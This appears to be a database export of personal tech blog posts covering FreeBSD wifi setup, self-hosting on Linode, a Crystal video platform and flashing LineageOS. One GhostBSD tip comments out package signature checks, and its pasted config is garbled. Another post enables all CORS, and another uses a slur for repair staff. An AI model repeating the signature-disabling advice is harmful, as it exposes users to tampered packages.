comprehend. I think most people have far more resilience to WeChat or similar apps than I do. In fact, I am easily addicted and distracted by many of those apps, sometimes leading me to not doing anything all day long, so I must forcibly separate myself from those apps to ensure my mental wellbeing. People don't seem to understand that since they have resilience and self-control(which I seriously lack in). I also have the freedom to dislike other products with adequate reasons.\n\n## What's Next?\n\nThe disk is 128 GB so I can store lots of 4k movies in it to watch offline. The whole working system is less than 4 GB now. It will probably gets larger, but with Alpine Linux it's just trivial to the whole disk.\n\nI have no idea why people run out of disk space. Just delete the freaking bloatwares and everything would be working fine. Like to be honest without running Pytorch, 30 GB is enough for the whole computer or mobile with wise management(size of smaller sized SD card).\n\nI will still need WeChat now and then, just not on a daily basis. For example, when like going to the hospital or doing certain things...\n\nWeChat is a mandatory software nowadays in China, if it isn't required I will delete WeChat.\n\nSometimes when I need to call a Taxi the AMap and BaiduMap works good in LineageOS, but I can try not to call taxi altogether. It's not that much of a discomfort, just manage time more wisely.\n\nWhich obviously brings me nostalgia again back to the summer of 2018 when I didn't have a smartphone yet(I kind of wished I never need to use one now), when I went to Pudong Gaoqiao Riverside Forest Park alone in a bus with my old \"Philip\" phone(for elders). I waited for the bus (it only came every 50 minutes) after taking the subway forever, but fortunately the bus came around 20 minutes, and when I tried to return home the bus came very quickly.\n\nDespite the inconvenience, I had less on my mind and had so much fun. I used to walk around and enjoy everything with a light-weighted heart, and look at the vast sea like nothing else mattered.\n\nI remembered on that day I had 200 RMB(a lot to me at the time), and went all alone, and I thought that I would have went there much easier if I could call taxi after exiting the subway station. But being free of smartphone trap gives a unique sense of joy and freedom to the mind.\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dea2"}, "title": "Exploring BSD: Incompatible Wireless Card", "date": {"$date": "2024-04-09T12:50:00Z"}, "type": "other", "access": 1, "body": "## Incompatibility\n\nToday I decided to play around with the BSD distros. I have used many Linux distros and found they are pretty much alike, no big difference anyways except for package managers. Anyways, I hopped on to the FreeBSD website and flashed the ISO to my usb.\n\nBSD distros are pretty much like Linux in the application level, they can also run Gnome or Kde Plasma or whatever, pretty much everything Linux runs.\n\nI installed the FreeBSD distro but there was a wifi card problem, and there was just no way to solve it. On researching I found my old laptop, which is Honor Magicbook, has this `RTL8822CE 802.11ac` as its wireless card, and I can't get it to work correctly in FreeBSD.\n\nIt was very frustrating and I tried `wpa_supplicant` many times, all failing. `ifconfig` couldn't detect the `wlan0`.\n\nThen I installed GhostBSD with Mate as DE because it was too frustrating working in that headless environment and it turns out this problem still couldn't be solved. I tried connecting via the graphic Interface, and it failed. Another reminder that graphic interface is more or less useless--you either solve it or you don't.\n\nThen I tried to use `wpa_supplicant` again, it complained about \"ioctl 80221\" and stuff. When rebooted I could see both `wlan0` and `eth0` with `ifconfig` but when I try `service netif restart`, it would destroy the `wlan0` interface.\n\nI think the main issue lives within the driver for the card. So in the meantime changing the card seem to be a good idea to experiment.\n\n## Changing the Realtek Card\n\nSo off I went around all around Hefei for computer repairing stores. My laptop is a Honor Magicbook. First I hopped on the bus to HongGang, just several kilometers down the road. I went there and there was a Honor store, however, they say they can't fix it.\n\nI went to JingDong computer repairing store, and there was a man sitting inside a room playing his mobile phone. I went in and asked and they said there wasn't a wireless card available, and that my system is \"weird\", they never seen anything like it before, obviously not knowing anything about it. The man tried to insert a usb drive for wifi, but it didn't work, and he frowned from the start to the end looking at Mate Desktop. I asked further and they said I would need to buy the card myself and it would need 80 RMB to fix it with my card.\n\nThen I went to the Honor after-sales service store, and they looked very annoyed after seeing my laptop, claiming they never seen such systems and they could only fix and repair with their \"official systems\", which of course is crappy Windows. The man said \"you probably know what you are doing and more than me\". Anyways, there wasn't much I could get out of them. I tried to ask if they would replace my wireless card but they refused, saying they could only give me their wireless card(rtw880).\n\nAnyways, then I eat at a KFC, and hopped on another bus, going to another computer repair store\uff0c just north of National Defense Technology University. There was 3 person in it, and when I asked if they could repair the computer for me they replied yes, but they couldn't solve the problem, claiming they never saw the system and it was beyond their knowledge. Anyways, I asked if they could change the hardware stuff and they said they don't have a wireless card available, and I need to buy one, and offered 50 RMB to change it. Then I got out.\n\nI tried walking to the fourth computer repair store, which has \"computer assembling\" in its name. It is around little less than a kilometer. But I walked there it was among torn-down houses, and the store is closed, and around me there was a million stalls selling all kinds of street foods, so much it almost blocked the road. People were having fun eating and talking to each other around me.\n\nThen I was very frustrated. I got on line 2 and went to Sanxiaokou station, and I went to another computer repair store called Didi repair. It was on floor 13 on a building. I went up and called the person, and he said he would come in 5 minutes. Anyways it is mainly a door-to-door service. I went in and showed him the wireless card problem, and he was kind of amazed and said he hadn't seen the system either. I told him it was BSD, and showed an article saying FreeBSD is amazing! Anyway, the man seemed very enthusiastic and easy-going, and offered to change the hardware for me. He is very friendly and we chatted a while, he saying that people are too impetuous nowadays. I expressed my strong interest in computer systems(or just playing, anyway).\n\nAfter that he got the tools, and he said he had an Intel Wireless Card from a computer from the 2010s, and he offered to fix it for me. He opened the Honor Magicbook and switched the Intel into it to replace to Realtech card.\n\nHe asked if I use Linux, and I said I used Linux as a daily driver. He said the repairing technicans are mainly vocational school grads, and doesn't know much about systems. He seemed very interested in command line operations and watched me as I stumbled around with `vi`. I edited the `/etc/rc.conf` and changed the `/etc/resolv.conf` and restarted the network. Then I edited the `wifi.conf` to be the network wifi of his office. I was very clumsly in the new system because I have been using Linux pretty much all the time and I was very clumsy with `vi`. I was always typing `nano`, `gedit`, `systemctl`, `journalctl` or commands like that from my muscle memory. Anyways after a long stumble I finally configured the `wpa_supplicant` to connect to wifi, and got an ipv4 with `dhclient`, then opened firefox, and I could go on websites!\n\nI was pretty overjoyed and satisfied with the journey, and I thanked the man and paid 800 RMB. He said I am welcome to hang around at other times. I find this man very friendly and easygoing--he took some pictures of the Mate Desktop and Fish Shell, saying he never seen such in his life, and he had a few Linux experiences. Then he said there is another customer using Linux, and maybe I could help whatever. I added WeChat and I went home.\n\n## Wifi Connection Summary\n\n### Check Network Interfaces\n\nRun the command `ifconfig` to list the active network interfaces. If `wlan0` is not listed and only `lo` appears:\n\n- Identify Wireless Hardware\n\nUse `pciconf -lv` to list all PCI devices. Specifically, filter for the wireless module (in my case): `pciconf -lv | grep iwm`\nThis command should return details such as `iwm0@pci0:1:0:0` followed by hardware details.\n\n- Configure Network Interface\n\n- Edit `/etc/rc.conf` to add(in my case for `iwm0`):\n\n```conf\nwlans_iwm0=\"wlan0\"\nifconfig_wlan0=\"WPA SYNCDHCP\"\n```\n\n- Restart Network Interface `service netif restart`\n- Verify that wlan0 is present with `ifconfig`\n\n### Configure Internet Access via wpa_supplicant\n\n- Set DNS Servers: edit /etc/resolv.conf\n\n```conf\nnameserver 1.1.1.1\nnameserver 1.0.0.1\n```\n\n- Create WiFi Configuration File\n\n```conf\nnetwork={\n  ssid=\"your_network_ssid\"\n  psk=\"your_network_password\"\n}\n```\n\nEnsure there are no commas between the lines.\n\n- Connect to the WiFi Network\n- Activate the wireless interface: `ifconfig wlan0 up`\n- Run wpa_supplicant to manage the WiFi connection: `wpa_supplicant -B -i wlan0 -c wifi.conf`\n- Obtain an IP address using DHCP:`dhclient wlan0`\n- Restart Network Services:`service netif restart`\n\n## Changing Mirrors\n\nChange the file `sudo vi /usr/local/etc/pkg/repos/FreeBSD.conf` to\n\n```conf\nFreeBSD: {\n  url: \"http://mirrors.ustc.edu.cn/freebsd-pkg/FreeBSD:14:amd64/latest\",\n}\n```\n\n(amd64 for me, might be different)\n\nThen Update and Upgrade Packages\n\n```sh\npkg-static update\npkg-static upgrade\npkg-static install -f pkg\n```\n\nInstall essential softwares\n\n```sh\npkg install bash vim nano sudo curl wget git tmux screen htop\n```\n\n## Configuring Xorg\n\nThis part is so hard to start and it took me a million years. I finally managed to work around by changing the driver to `scfb`\n\n## Getting Packages from Ports\n\nSo in freebsd there is ports. sort of like `aur`, and the packages not available in the official repo can be compiled through that, but you first pull all the code locally, then occasionally pull them from github, and compile the things needed. All the code together was only 1.1 GB.\n\n```sh\nsudo git clone --filter=tree:0 https://mirrors.ustc.edu.cn/freebsd-ports/ports.git /usr/ports\n```\n\nEven chromium isn't available in the official repo, so lots of things needed to be compiled.(kinda like Gentoo)\n\n## Problems\n\nTutorials aren't as comprehensive as Linux, but people say BSD is more stable.\n\nThe wifi is too much of a pain, and there isn't a frontend for it anywhere. Connecting through `wpa_supplicant` is very tiresome.\n\nI am practically a noob in wifi configuration. I have used iwctl and nmtui but not wpa_supplicant that much, and in the end I settled with `GhostBSD` as it is more straightforward.\n\n## Fixing the Signature Problem in GhostBSD\n\nI can also use a FreeBSD mirror in GhostBSD, but there is default validation configuration, simply comment out these lines in `/etc/pkg/GhostBSD.conf`,\n\n```conf\nGhostBSD: {\n  url: \"https://pkg.ghostbsd.org/stable/${ABI}/latest\",\n#  signature_type: \"pubkey\",\n#  pubkey: \"/usr/share/keys/ssl/certs/ghostbsd.cert\",\n#  enabled: yesexport http_proxy=\"http://localhost:7890/\"\n}\n```\n\nThe default mirror is very very slow, so I switched back to USTC FreeBSD mirror.\n\n## Latest Mirror Lack of tools\n\nThe latest mirror doesn't have lots of things like chromium or osscode, so I switched to the quarterly mirror. It doesn't have `os-generic-userland-devtools` as well, which is required to compile packages, so I ended up switching having a really long time figuring out how to configure things to compile.\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dea3"}, "title": "Misconceptions and Observations from Working with Linode and Mern Stack", "date": {"$date": "2024-03-28T11:10:00Z"}, "type": "web-dev", "access": 1, "body": "## Development vs Production\n\nFor example, in React, use `sudo npm start` to start the web server, but\nactually running in production compiles the code into static HTMLs in a\nbuild directory.\n\n## Use of Nginx\n\nUsing Nginx effectively sets up a reverse proxy, so there is no need for\nseparate machines for different addresses. There is no need for separate\nfrontend and backend Linodes, just set up a reverse proxy to proxy to\nthe backend from a specific route.\n\n## Systemctl Jobs\n\nActually, setting up nginx.conf to point to the frontend build directory\neffectively starts the website, so there is no need for a systemctl job\nto keep running `npm start` or whatever.\n\n## Object Storage (S3) vs Volumes\n\nS3 storage is popular for large file storing (e.g., video hosting),\nwhile volumes are SSDs along with the operating system. Space on the\noperating system is expensive, costing about 0.1 dollar a month for 1\nGB. While object storage like Cloudflare R2 is \\$0.015 / GB-month. So,\nit's more scalable to host media in Object Storage than locally, while\nObject Storage might be slower to access, utilizing a built-in CDN\nsolves the problem.\n\n## SaaS\n\nSome popular SaaS services include MongoDB.\n\nMongoDB Official website bans Russian IPs, claiming to support Ukraine.\nThere are also other MongoDB providers like Digital Ocean. There is even\nservice for MongoDB in Yandex, though.\n\nAnyways, MongoDB is open source and can be run locally. The official\nwebsite only provides a more stable and scalable option, and just\nsetting up MongoDB from yay and connecting to it in Node.js is\nstraightforward.\n\n## Some Preferences\n\nNo GUI, GUI messes things up.\n\nSet up server and run programs myself. First, it is akin to my local\nArch Linux environment, and shouldn't be that hard. Secondly, using\nthird-party tools messes things up, and third-party GUI tools so-called\npanels are especially confusing and misleading, making it impossible to\ndebug and control.\n\nLess payment, since excessive paying is useless.\n\nFewer external tools/platforms. These mess things up. Especially\nproprietary and commercial companies. Google transferred its domain\nnames to Squarespace, which is weird. So, I transferred all domains to\nCloudflare.\n\n\n\n\n## MongoDB Security\nNever leave MongoDB exposed! It will get hacked. Never change the access IP to 0.0.0.0 without configuring a password. Data will be deleted, with only a Bitcoin address left for recovery (which disappeared in 12 hours). More like, don't store anything valuable in the MongoDB database, and hash (or encrypt) everything sensitive.\n\n## SSH Security\nSimilarly, use strong passwords for SSH.\n\n## DbaaS Latency\nDbaaS (Database as a Service) tends to have higher latency, but MongoDB Atlas generally works fine. It reduces the time to maintain the database, and offers backups.(though I can manually backup the database)\n\n## Cloudflare AI Worker\nFor utilizing Cloudflare AI worker, the Llama model seems really good, quick, and cheap, but the OpenAI Whisper isn't working, keeps saying upstream service error.\n\n## Increasing Temporary Space for PyTorch\nFor installing PyTorch on CPUs, I need to increase tmp space using `sudo nano /etc/systemd/system/tmp.mount`.\n\n```systemd\n[Unit]\nDescription=Temporary Directory\nAfter=local-fs.target\n[Mount]\nWhat=tmpfs\nWhere=/tmp\nType=tmpfs\nOptions=mode=1777,size=8G\n[Install]\nWantedBy=multi-user.target\n```\n\nThen \n```sh\nsudo systemctl daemon-reload\nsudo systemctl enable tmp.mount\nsudo reboot\n```\n\nIncrease the tmp space.\n\n## Python Script Killed\n\nUse `dmesg` to find the problem.\n\nIf it's running out of memory: include the Swap space in Linode. Not a good solution, but enough for scripts running 24/7.\n\nUse separate Linodes for managing the worker and the server, because merging the two might cause the server to become not responsive (could be managed with `cpulimit` but takes lots of time).\n\n## Temp Files in Python\n\n```py\ntemp_dir = tempfile.mkdtemp(dir=os.getcwd())\n```\nthen use shutil to remove it.\n\n## Video Upscaling\n\nToo expensive to run; outdated projects throw an error: No module named 'torchvision.transforms.functional_tensor', and waifu2x upgrading is not that good. It's slightly better than original, but far from native 4k videos (blurry in previously clear parts like black and white stripes). Using `lanczos` is far less good .\n\nFace upgrading seems ok, but it only offers face enhancement. More akin to Web Glow.\n\n## Environment Problems\n\nUse  a `builduser` and `yay`, you can remove the password (set `emptypasswordssh` to no). Then use that user to install things with `yay`, and for Python libraries: either install with `yay` (sometimes takes a long time compiling) or simply use `venv`.\n\nI like Arch Linux because it's DIY, and any problems comes from the user. Ubuntu packages need to be compiled/downloaded at an up-to-date version to work.\n\n## Claude vs GPT\n\nGPT seems to be getting nerfed and becomes lazy with coding. Claude opus/sonnet much better.\n\n## Nginx\n\nIncrease  `maxhashsize` to 4096, and give permissions (or use a specific user, in my case `builduser`), or else visiting the webpage will result in a 500 error. Arch Linux doesn't have `nginx` nor `www-data` user by default.\n\n## Translation Tools\n\nThere are many translation tools available, including Google-t5, Facebook's NLLB Distilled, Helsinki NLP, etc. Just download the model from Hugging Face, then use Transformers, and it runs pretty smoothly when translating VTT files. But it still takes a really long time. Then there's Argos Translate and CTranslate built on OpenNMT models.\n\n## Speed Comparison\n\nLaptops are by far much worse in terms of CPU performance compared with cloud servers. My laptop, though high-end, takes about the same time to process a video as an 8 GB Linode with 4 CPUs (it's not utilizing all 16 CPUs on my laptop, but you get the idea). Cloud servers also offer much faster internet speed.\n\n## Running Costs\n\nRunning a GPU constantly is way too expensive for me; the prices range from 0.2-5 dollars an hour. Even a single-core, very low-end 0.2 dollar/hour GPU, typically RTX 3000 or 4000 series, costs like 150 dollars a month. I kind of understand why these websites want to charge people money\u2014they have all those running GPUs in the background. The raw costs and maintaining them are really expensive, and like, you have to have much more available than the normal workload. Those companies don't turn on and turn off those GPUs like I do when I was doing homework for customers, though, because it has to be readily available.\n\nThen there are 3rd party API services, like Whisper APIs. But those are still very expensive. Transcribing an hour of audio costs around 0.2 dollars. Comparably much cheaper than freaking Veed Premium, which is like 20 dollars a month to use for like 100 minutes of transcription services! Those commercial companies wrap everything up in fancy frontend frameworks, and you never know how expensive they charge!\n\n## Transcribing services\n\nRunning OpenAI Whisper on CPU is so slow! It goes on forever for transcribing 30 seconds. It's just very, very slow and my computer's fan was complaining all the time.\n\nDistilled Whisper doesn't support other languages, only English. I was like: I don't need to transcribe English, I can hear words clearly no matter.\n\nSo I chose Faster-Whisper, which is much faster, and generally accurate enough for me.\n\nThere's also \"Insanely Fast Whisper,\" except it's not available on CPU. I have no idea, since like the point of quantization is for models to run on fewer resources.\n\nTo be honest, strangely Whisper sometimes doesn't catch one word in a song, but Faster Whisper does well with songs.\n\nLinode 8GB costs $0.072 an hour, and running Faster-Whisper on it for an hour can transcribe about a 2-hour video, which is much cheaper than the API services, although one might argue it's not that scalable. Given 100 hours of audio, it takes that long to translate on Linode, but with one click of an API (since it's designed to scale), you can produce the results. It's probably 10 times cheaper than the third-party stuff, but, I don't think the third-party companies did quantization, though.\n\nThere's also Dropbox which offers free transcribing for uploaded videos, not that I like Dropbox or something. In fact, there are so many of those companies offering nowadays, like YouTube's default transcription(which is weird and I still haven't figured it out, sometimes it is good other times it is disabled, and very bad).\n\n## React Theme\n\nThere is a Dark Reader npm library to implement different themes and it's extremely easy and popular! I wished I had used that instead of manually implementing a dark theme with React's context api for my personal website before. \n\nBut the iframe was a big trouble. Actually it's my first time implementing iframes so like they are a big headache. Passing props to the iframe page doesn't work to iframes on a page, and I tried about 2 hours to manipulate the iframe with previous methods and failed. Then I used the send message api and it worked good, just basically send a message to the iframe, and let it handle the message and toggle the theme.\n\n## Conclusion\n\nSelf-hosting is awfully addictive and fun, aiming to get rid of \"necessary\" proprietary commerical bloated platforms. But it's kinda limited as well, and maintaining cost real lot of efforts. For example, the bugs of in frontend react is a constant headache(actually I hate frontend now). I can enjoy videos with subtitles and watch them anywhere.\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dea4"}, "title": "Coding a Full Stack Video Platform", "date": {"$date": "2024-03-18T07:36:00Z"}, "type": "web-dev", "access": 1, "body": "Recently, the idea of self-hosting was so intriguing that I decided to code a full-stack video platform.\n\n## Cloud Object Storage Selection\n\nThere are many Object Storage providers, including Amazon AWS, Akamai, Digital Ocean, Cloudflare, Alibaba Cloud. Nearly all of them are compatible with AWS S3 storage. I previously tried to self-host Nextcloud and File Storage with s3fs, but they are pretty slow on the frontends, capping at about less than 1 MB/s, in fact, too slow for the storage to be utilized.\n\nChoosing either is fine, but I chose Cloudflare because Cloudflare R2 is very fast and efficient, and I am already using Cloudflare services. It is slightly more expensive than Dropbox, but self-hosting is so much fun and controllable than using a proprietary service. Dropbox is generally good enough to use, except for a few occasions when the Dropbox frontend UI dies.\n\nCloudflare is good because it is really cheap and offers many other services, like a proxy for servers to prevent against DDOS, and it is also a domain registrar. Cloudflare has everything except VPS for web hosting.\n\nI tried contacting Alibaba and got a response, unfortunately, I use neither of those apps(just deleted Telegram). Alicloud is probably the cheapest for 1 PB storage, at 132120 dollars a year(while Cloudflare is 15 dollars/month for 1 TB and Amazon is around 22 dollars/month for 1 TB except for its glacier archives). Dropbox has like 10 dollar/month for 2 TB, but I reckon if people actually utilized their Dropbox storage the company will go bankrupt. that if I want to start a business (if in China) it can be a viable choice.\n\n<img src=\"https://cdn.jimchen.me/Screenshot%20from%202024-03-18%2008-42-39.png\"/>\n\n## Designing the Backend\n\nAfter that, I init the PostgreSQL and added some user and video schemas.\n\nI started coding with raw metal with Golang, and then I was busy for like a week, then I accidentally threw away the draft, so I started over again. It's not like I coded a lot anyway.\n\nMainly because Invidious uses S3. Using Node.js is totally feasible, I just wanted something new to try for fun.\n\nI didn't know Ruby language before, but Crystal is still very easy to pick up, and it claims to be lightning quick (as quick as C language).\n\nDesigning the backend is pretty easy, as I aim for a small-scale project. Just sync everything before uploading to Object Storage, add them to the local database. Then retrieve everything from the local database.\n\nThe current backend looks like this\n\n```sh\n\u251c\u2500\u2500 config.yml\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 shard.lock\n\u251c\u2500\u2500 shard.yml\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 backend.cr\n    \u251c\u2500\u2500 config.cr\n    \u251c\u2500\u2500 controllers\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 auth_controller.cr\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 storage_controller.cr\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 user_controller.cr\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 video_controller.cr\n    \u251c\u2500\u2500 extensions\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 context_extension.cr\n    \u251c\u2500\u2500 middlewares\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 auth_middleware.cr\n    \u251c\u2500\u2500 routes.cr\n    \u2514\u2500\u2500 storage\n        \u251c\u2500\u2500 check_existence.cr\n        \u251c\u2500\u2500 delete_file.cr\n        \u251c\u2500\u2500 generate_upload_url.cr\n        \u251c\u2500\u2500 list_files.cr\n        \u2514\u2500\u2500 upload_url.cr\n```\n\nMainly shards is a dependency tool, and add a middleware to help the authorization by signing a private key in `config.yml`, and routes look like this (kind of like node.js)\n\n```crystal\nget \"/api/user/:id\", &->UserController.get_user(HTTP::Server::Context)\npost \"/api/auth/signup\", &->AuthController.sign_up_user(HTTP::Server::Context)\n```\n\nThe syntax isn't hard, not that hard to learn from a Node.js background, and ChatGPT knows pretty much of it. Mainly the backend is for interacting with the PostgreSql.\n\n## Trying to Generate the Signature Myself\n\nThere is this s3 library for Crystal https://github.com/taylorfinnell/awscr-s3, when I tried to generate a presigned url for the user to upload videos. I don't want the user to upload to the server, instead, I want it to upload directly to the cloud. But the built-in method always generates incorrectly, and there wasn't anything I could do. I tried coding a generation myself with ChatGPT, but it didn't generate correctly either, repeatedly returning the Signature didn't match.\n\nSo basically they MAC the date and time with the access secret key for s3, and it was pretty nitty-gritty detailed like whatever thing they need. The boto in python and node.js has built-in generation methods.\n\nI searched another repo https://github.com/iksteen/aws-request-signer and it did generate a key, but the key wasn't working either, probably because it was pretty old and Amazon had like another key signing method.\n\nMainly because my endpoint is Cloudflare while most of the key generation have endpoints to s3 amazonnews, but I thought like they should both work.\n\nI spent a whole dawn and morning trying to do this and failed, so I gave up and used boto embedded in crystal since crystal can execute Bash.\n\nStill, the presigned url has a limitation of like 5 GB.\n\n## Designing the Frontend React\n\nSince this project is still in Alpha, I just fetched everything from the backend. Since there aren't much in the backend, and there isn't traffic, processing everything in frontend code seems straightforward.\n\nI jumped from Claude Opus to ChatGPT, and the frontend got good enough very quickly. The frontend just includes signup, login, upload, and viewing videos right now, although I plan to add extensive features. The backend isn't mature enough right now\n\nOverall I spent a little over 2 full days of the weekend at home building the crap. It seems good enough for a raw implementation for a frontend, though, and I deployed it to [anony.tube](https://anony.tube/) and [anonytube.jimchen.me](https://anonytube.jimchen.me/).\n\nCloudflare offers good speed, generally, and there wasn't much problem with uploading and downloading videos, since I am directly communicating with Cloudflare.\n\nThen it's like managing Cors and https, and that is really tiresome, like some requests just won't work in the server's frontend. Anyways like after trying I pretty much enabled all Cors, which isn't good for security but anyways good enough for like normal usage.\n\nI added the token in cookies for expiration over 7 days. I checks if the user have the correct token in cookie on entering the webpage, if they do, they are automatically logged in. Also they are redirected from signin to the webpage if they have credentials.\n\n## More Features to Add\n\nFirst, I am adding an NSFW detector, since I am aiming for legal hosting. I am also aiming for like no copyright contents or DMCA. I am also hoping to add different resolutions for videos. Anyways, I am pretty tired for now.\n\n## Cost\n\nIt's actually surprisingly cheap for a small video platform, as the server cost 5 dollars a month for Linode Nanode, and like storage costs 15 dollars a month for 1 TB, which I probably won't need for now. Cloudflare does most of the job for me.\n\n## About Public Video Platforms\n\nMany video platforms have awfully problematic features and I don't really like them. They try every method possible to stop downloading, only resulting in slower speeds. I also hate the login(and especially hate the fraudulent poping up of forcing me to login). Anyways, these platforms have to comply with local laws, so it's more understandable to have control. But I am aiming for liberty (also within laws) for my platform, mainly hoping to enhance the experience of a guest user. I think another reason might be that they wrote large junky code 10 years ago which are too trash to debug or fix.\n\nThere are lots of existing platforms like Peertube and YouPHPTube, but I just want to design one myself for the fun sake of it.\n\nBut the problem is probably no one will visit this website, so in the end, it will probably end up like a Dropbox for my personal use. Many people probably like those video platforms anyways, since a determined person who hate those video platforms probably sought for self-host options like me, and I do not consider myself technically advanced or something. So don't believe it when people are complaining, because chances are they actually don't mean it:)."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dea5"}, "title": "Booting LineageOS(Finally)", "date": {"$date": "2024-03-09T02:01:00Z"}, "type": "other", "access": 1, "body": "## Exploring More Phones\n\nI've failed countless times while experimenting with different phones\nand operating systems.\n\nUnlike computers, which have a universal architecture, each phone\npossesses its unique structure. This makes installing operating systems\non them exceedingly challenging.\n\nFurthermore, the repair technicians lack the necessary expertise to\nassist me with these challenges. Consequently, I've had to solve all the\nproblems myself, which adds a layer of frustration to the process.\n\n\n## Unlocking Bootloader\n\nThen, I unlocked the bootloader of my old Redmi Note 10, which I had\nused 2.5 years ago. After unlocking, I attempted to install Ubuntu\nTouch. However, the ubports installer consistently faced a downloading\nissue due to GitHub connectivity problems, which I couldn't fix. Thus, I\nwas unsuccessful in installing Ubuntu.\n\n## Trying to Install Different OS\n\nNext, I attempted to install LineageOS on the Redmi Note 10. However,\nafter booting into fastboot mode, I couldn't flash the boot.img and\nrecovery.img onto the phone. The fastboot froze indefinitely while\ntransferring these files, leaving me unable to proceed.\n\nPostmarket OS appeared to only support Pinephone and Librem 5 phones.\nHowever, my PinePhone stopped reading any SD card, so installing it was\nnot feasible.\n\n## Removing Xiaomi Bloatwares\n\nI then used adb to list packages with `adb shell pm list packages`, and\ndiscovered numerous bloatwares. Xiaomi, in my opinion, is the worst\ncompany, with their phones filled with unnecessary spywares.\n\nAfter listing the MIUI packages, I used `adb shell uninstall` to remove\nthem, aiming to eliminate the cumbersome MIUI. Some apps were\nsuccessfully uninstalled, while others persisted, and I couldn't remove\nthem even with root permissions.\n\nSubsequently, I found myself unable to return to the home screen, and\nupon rebooting, the phone entered a boot loop, rendering it inoperable\nyesterday.\n\n## Repairing People with Intellectual Retardation\n\nSo I went to MiUI store, hoping to get the crap fixed and get LineageOS\ninstalled. But the reparing person are kind of intellectual retarded,\nand they know far less than me though. They didn't even know or care\nwhat is LineageOS. The technicians there seemed less knowledgeable than\nme about such niche, open-source, and controlled systems. They were\nunfamiliar with adb and couldn't assist in reviving my phone.\n\nNevertheless, I managed to figure out how to reopen the phone today\nfairly quickly. By entering the recovery menu and wiping all the data,\nthe phone rebooted into a new MIUI system, again laden with bloatwares.\n\n## Messing Up with Phone Once More\n\nThis time, I didn't blindly remove all Xiaomi bloatwares. Instead, I\nresearched online and tried to remove only those identified as\nbloatwares. Since there were hundreds, manual removal was impractical,\nfurther highlighting the phone's annoyances.\n\nAfter using adb to uninstall and disable some apps, I encountered issues\ninstalling new apps due to not being signed into the MIUI account.\nUninstalling certain apps had prevented me from signing in, leaving me\nwith no option but to wipe the data again.\n\n## Trying to Customize Again\n\nOn my next attempt, I removed the packages manually, one by one. It was\na tedious process. After removing the theme, my wallpaper became pure\nblack, aligning with my preference for dark mode.\n\nThen, I installed Google Phone, Google Files, Google Messages, Google\nPhotos, Google Chrome, and some other apps using APK Pure, Softonic, and\nUptodown APKs via computer and adb.\n\nI tried installing Google Play Store, but it wouldn't open. Even using a\nGoogle installer didn't help. However, I realized that I didn't\nparticularly need the Google Play Store. Firstly, I don't heavily rely\non a smartphone, with WeChat being my primary app. Secondly, I'm not a\nfan of the Google Play Store. Thirdly, I can source all necessary APKs\nmyself.\n\n\nAnyways, looking back at my journey, smartphones were really hard on me, unlike the exploration of other tech. Archlinux and LFS didn't take much time to set up, and cloud servers are very intuitive to me; I understood everything in a fairly short time.\n\n## How to Install LineageOS\n\nSo basically, you need an **unlocked** & **supported** phone. One can install ArchLinux or Ubuntu on practically every laptop device, but mobile is different in terms of architecture.\n\nActually, there are no official builds for my old phone (Redmi Note 10 5G); to be honest, the phone is nothing but a whole piece of bloatware trash piled together with built-in spyware and censorship.\n\nI was lucky to find this post where a Russian developer released LineageOS for that model:\n[https://xdaforums.com/t/rom-13-unofficial-camellia-camellian-lineageos-20-0-with-ota-support-updated-28-01-2024.4618399/](https://xdaforums.com/t/rom-13-unofficial-camellia-camellian-lineageos-20-0-with-ota-support-updated-28-01-2024.4618399/)\n\nThere are many unofficial releases for those community-driven open source projects.\n\nI found it surprisingly easy to implement.\n\nSource: [https://m929.ru/](https://m929.ru/)\n\n**How to flash ROM:**\n\n1. Install ROM's recovery using: fastboot flash boot boot.img\n2. Boot into recovery In Pixel, adb sideload must be enabled in the apply update section.\n3. On your PC with the downloaded ROM, type in the terminal: adb sideload ROM.zip\n4. Flash firmware A13; download from mega.nz\n5. Wipe data/factory reset\n\nLike basically, after flashing that and wiping the data, I had a working LineageOS!\n\n## Many Types of Phones\n\nI don't get why there are so many phone manufacturers and so many phone brands out there. Moreover, I don't understand why they need to release tens of hundreds of phones every year, literally for the sake of it. I mean, I don't really see a difference between those brands, except for different **default** operating systems and UIs, which I want to customize myself.\n\nI think it's all a commercial joke, this booming market of OS. Today I went into a phone reseller store and asked the price, and they said the cheapest is more than 1000 RMB. It's so crazily expensive compared to other things, especially considering it's a reseller. I mean, I can buy a good-end brand-new phone with 1000 RMB. Then I went into Samsung Galaxy and asked them for these models (that Postmarket OS supports):\nSamsung Galaxy A5, Samsung Galaxy E7, Samsung Galaxy S III\n\nThey were kind of surprised in finding I want so freaking old phones, and for a moment I couldn't help but burst out laughing. I mean, it was just hilarious.\n\nI seriously don't understand the need to buy the newest phones or update them like three times a year.\n\n## Why I Dislike Defaults\n\nI mainly dislike defaults because of a lack of support for personal customization and their bloatware properties. Still, I am a lazy person, and I don't do extensive Gnome customization or vim scripting. If something is optional and free, actually chances are I would still like to use it. If something is free and proprietary I wouldn't have anything against it. But the problem lies in the multiple bugs and closed source of the operating systems or software that there's just no way to fix for someone not in the company. Sometimes I find a bug I probably want to try to solve on my own. But sometimes with iOS and Google Bugs (like an app won't work), there are just no ways to find the solutions.\n\n## Realizing My Journey These Years\n\nLooking back into my teen years, literally, I have shown strong dislike for smartphones. I didn't have a smartphone my entire middle school career, only inheriting one from my dad in the summer of 2020 when I was going to high school. I hated the idea of a smartphone for as long as I could remember. I wasn't opposed to other tech stuff; like, I used a computer long before that and had my own computer in the 6th grade.\n\nI probably missed adding lots of people to WeChat contacts, looking back. Like literally, I was so ignorant of the existence of WeChat and so arrogant of the whole concept.\n\nI can probably say that most of my new preferences today don't come from nowhere but are like this for many years, except previously either externally controlled, restricted, or just having some gaps that I couldn't cross with limited skills.\n\nI was born different from many people, and I don't want to judge who is better. Different people can have different preferences, none more superior than the others. Yet, I am hoping to maintain mutual respect for people with different digital philosophies.\n\nEven after I had a smartphone, I was much against using it. During the summer before I went to university, I limited my 